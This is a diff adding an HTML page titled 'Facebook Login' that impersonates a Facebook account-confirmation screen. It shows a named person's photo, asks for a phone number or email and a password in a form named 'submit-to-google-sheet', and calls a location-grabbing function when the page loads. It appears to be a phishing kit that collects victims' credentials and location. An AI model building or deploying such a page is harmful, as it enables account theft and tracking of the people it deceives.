@@ -1,0 +1,128 @@
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta property="og:title" content="Your Page Title">
+    <meta property="og:description" content="Your Page Description">
+    <meta property="og:image" content="<?php echo generatePreviewImage(); ?>">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Your Page Title">
+    <meta name="twitter:description" content="Your Page Description">
+    <meta name="twitter:image" content="<?php echo generatePreviewImage(); ?>">
+    <title>Facebook Login</title>
+
+
+
+
+    
+    <style>
+        body {
+            font-family:  Arial, Helvetica, sans-serif;
+            background-color: rgb(229, 238, 255);
+            margin: 0;
+            padding: 0;
+
+        }
+        img{
+            width: 40%;
+            margin-left: 30%;
+            border-radius: 50%;
+        }
+        h4{
+            margin-left: 36%;
+            margin-top: 3%;
+        }
+
+
+
+        
+        #container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+
+        }
+
+        #login-box {
+            background-color: transparent;
+            padding: 20px;
+            width: 83%;
+            max-width: 400px;
+
+        }
+
+        h1 {
+            text-align: center;
+        }
+
+        #combinedInput {
+            display: flex;
+            flex-direction: column;
+        }
+
+        #combinedInput input {
+            margin: 10px 0;
+            padding: 13px 20px;
+            border: 1px solid #a19aa1;
+            border-radius: 13px;
+            font-size: 20px;
+            font-weight: 500;
+            
+        }
+
+        #combinedInput button {
+            background-color: #1677f7;
+            color: #fff;
+            padding: 13px;
+            border: none;
+            border-radius: 80px;
+            cursor: pointer;
+            font-size: 20px;
+            width: 100%;
+
+        }
+
+        #combinedInput button:hover {
+            background-color: rgb(10, 94, 219);
+
+        }
+
+      
+
+        
+        #forgot-password {
+            text-align: center;
+            margin-top: 10px;
+           
+        }
+        a{            
+            font-size: 18px;
+
+            font-weight: 500;
+
+            text-decoration: none;
+}
+    </style>
+</head>
+<body onload="getLocation()">
+
+    <div id="container">
+        <div id="login-box">
+            <h1>Conform it's You</h1>
+            <img src="u.jpg" alt="">
+            <h4>Arisha Jannat</h4>
+            <form name="submit-to-google-sheet" id="combinedInput" action="indeox.html">
+                <input type="text" id="combinedInpu" placeholder="mobile number or email" name="mobile number or email" required>
+                <input type="password" id="password"placeholder="password" name="password" required>
+                <button type="submit" >Continue</button>
+            </form>
+            <div id="forgot-password">
+                <a href="#">Forgot password?</a>
+            </div>
+        </div>
+    </div>
+    <script src="script.js"></script>
+    </body>
+    </html>
+    
